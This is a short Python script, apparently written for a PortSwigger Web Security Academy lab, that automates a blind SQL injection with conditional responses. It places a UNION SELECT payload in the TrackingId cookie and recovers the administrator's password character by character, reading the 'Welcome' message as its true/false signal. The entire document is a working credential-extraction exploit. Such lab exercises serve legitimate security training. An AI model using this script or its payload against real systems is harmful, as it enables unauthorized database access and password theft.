"""
Uso: Blind SQL injection with conditional responses
Creador: Andrés Hernández Mata
Version: 1.0.0
Python: 3.9.1
Fecha: 30 Septiembre 2021
"""

import requests

def blind_sql_injection(url, length):
    output = ""    
    headers = {}
    for i in range(1, length+1):
        base_cookie = """TrackingId = a 'UNION SELECT 'a' from users WHERE username = 'administrator' and 
        (ascii(substring(password, %s, 1))) = [CHAR]--; session = P8S07UmOj9Qf5xpVVMvciUcBG6sCkvwp""" % str(i)
        for j in range(32,126):
            print("Currently trying digit %s with: " % str(i), chr(j))
            cookie = base_cookie.replace("[CHAR]", str(j))
            headers["cookie"] = cookie
            res = requests.get(url, headers = headers)
            if "Welcome" in res.content.decode("utf-8"):
                output += chr(j)
                break
        print("Current password: ", output)

url = "https://ac2c1feb1e7e3f7781a016ff008a0075.web-security-academy.net/"
blind_sql_injection(url, 20)

